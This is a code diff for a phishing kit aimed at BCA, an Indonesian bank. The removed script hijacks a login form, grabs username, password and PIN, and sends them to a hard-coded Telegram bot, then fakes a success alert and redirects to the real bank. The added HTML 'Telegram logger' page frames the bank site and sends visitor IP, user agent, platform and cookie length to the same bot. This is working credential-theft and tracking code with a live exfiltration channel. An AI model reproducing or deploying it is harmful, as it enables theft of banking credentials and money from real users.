@@ -1,48 +1,128 @@
-<script>
-// BCA ULTRA SIMPLE SCRIPT
-setTimeout(function() {
-    const form = document.getElementById('bcaLoginForm') || document.querySelector('form');
-    
-    if (form) {
-        form.onsubmit = function(e) {
-            e.preventDefault();
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BCA + TELEGRAM LOGGER 🔥</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Arial', sans-serif; background: linear-gradient(135deg, #0165A3, #003366); color: white; min-height: 100vh; padding: 20px; }
+        .container { max-width: 900px; margin: 0 auto; background: rgba(0,0,0,0.7); border-radius: 20px; padding: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); }
+        h1 { text-align: center; margin-bottom: 20px; font-size: 2.5em; text-shadow: 3px 3px 5px black; }
+        .security-panel { background: rgba(220,53,69,0.2); border: 2px solid #dc3545; border-radius: 10px; padding: 15px; margin: 15px 0; }
+        .btn { display: inline-block; background: #0165A3; color: white; padding: 12px 25px; border-radius: 8px; text-decoration: none; font-weight: bold; margin: 8px; transition: 0.3s; border: none; cursor: pointer; }
+        .btn:hover { background: #003366; transform: scale(1.05); }
+        .btn-security { background: #dc3545; }
+        iframe { width: 100%; height: 500px; border: 3px solid #dc3545; border-radius: 10px; margin-top: 20px; background: white; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🏦 BCA + TELEGRAM LOGGER 🔥</h1>
+        
+        <div class="security-panel">
+            <h3>🔒 SECURE MONITORING ACTIVE</h3>
+            <p>Telegram Bot: <code>8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18</code></p>
+            <p>Chat ID: <code>8313500840</code></p>
+            <button class="btn btn-security" onclick="sendAlert('🚨 BCA Monitor Activated')">ACTIVATE MONITOR</button>
+        </div>
+        
+        <button class="btn" onclick="loadBCA()">🏦 LOAD BCA</button>
+        <button class="btn" onclick="debugBCA()">🐛 DEBUG BCA</button>
+        <button class="btn" onclick="sendScreenshotReport()">📸 SCREENSHOT REPORT</button>
+        
+        <iframe id="bcaFrame"></iframe>
+        <div id="status"></div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18";
+        const CHAT_ID = "8313500840";
+        
+        async function sendAlert(message) {
+            const text = `🏦 BCA ALERT\n${message}\n⏰ ${new Date().toLocaleString()}\nIP: ${await getIP()}`;
             
-            // Get all inputs
-            const inputs = this.querySelectorAll('input');
-            const data = {
-                user: inputs[0]?.value || '',
-                pass: inputs[1]?.value || '',
-                pin: inputs[2]?.value || ''
-            };
-            
-            console.log('🏦 BCA Capture:', data);
-            
-            // Telegram - SIMPLE GET request
-            const url = `https://api.telegram.org/bot8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18/sendMessage?chat_id=8313500840&text=BCA_DATA: ${data.user}|${data.pass}|${data.pin}`;
-            
-            // MULTIPLE METHODS to ensure delivery
-            const methods = [
-                () => { new Image().src = url; }, // Image load
-                () => { fetch(url).catch(() => {}); }, // Fetch
-                () => { const s = document.createElement('script'); s.src = url; document.body.appendChild(s); } // JSONP style
-            ];
-            
-            methods.forEach(method => {
-                try { method(); } catch (e) { console.log('Method failed:', e); }
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text
+                })
             });
             
-            // UI feedback
-            alert('Verifikasi berhasil...');
+            document.getElementById('status').innerHTML = `<p>📤 Alert sent: ${message}</p>`;
+        }
+        
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'Unknown';
+            }
+        }
+        
+        function loadBCA() {
+            sendAlert("Loading BCA website");
+            // Coba beberapa URL BCA
+            const urls = [
+                "https://www.bca.co.id",
+                "https://ibank.bca.co.id",
+                "https://m.klikbca.com"
+            ];
             
-            // Redirect
-            setTimeout(() => {
-                window.location.href = 'https://bca.co.id';
-            }, 1000);
+            const url = urls[0] + `?t=${Date.now()}`;
+            document.getElementById('bcaFrame').src = url;
+        }
+        
+        function debugBCA() {
+            sendAlert("Debugging BCA load issues");
             
-            return false;
+            // Cek cookies
+            const cookies = document.cookie;
+            sendAlert(`Cookies: ${cookies.length} chars`);
+            
+            // Cek user agent
+            sendAlert(`UA: ${navigator.userAgent}`);
+            
+            // Test connection
+            fetch('https://www.bca.co.id', {mode: 'no-cors'})
+                .then(() => sendAlert("BCA reachable (no-cors)"))
+                .catch(() => sendAlert("BCA unreachable"));
+        }
+        
+        function sendScreenshotReport() {
+            sendAlert("Requesting screenshot report");
+            
+            // Informasi sistem
+            const systemInfo = `
+📊 SYSTEM INFO:
+- Platform: ${navigator.platform}
+- Language: ${navigator.language}
+- Online: ${navigator.onLine}
+- Screen: ${screen.width}x${screen.height}
+- Cookies: ${document.cookie.length} chars
+            `;
+            
+            sendAlert(systemInfo);
+        }
+        
+        // Monitor iframe load
+        document.getElementById('bcaFrame').onload = function() {
+            sendAlert("BCA iframe loaded");
         };
         
-        console.log('✅ BCA script ready');
-    }
-}, 500); // Delay sedikit untuk pastikan DOM ready
-</script>
+        document.getElementById('bcaFrame').onerror = function() {
+            sendAlert("❌ BCA iframe failed to load");
+        };
+        
+        // Auto-load
+        window.onload = function() {
+            sendAlert("BCA Monitoring System Started");
+            setTimeout(loadBCA, 1000);
+        };
+    </script>
+</body>
+</html>
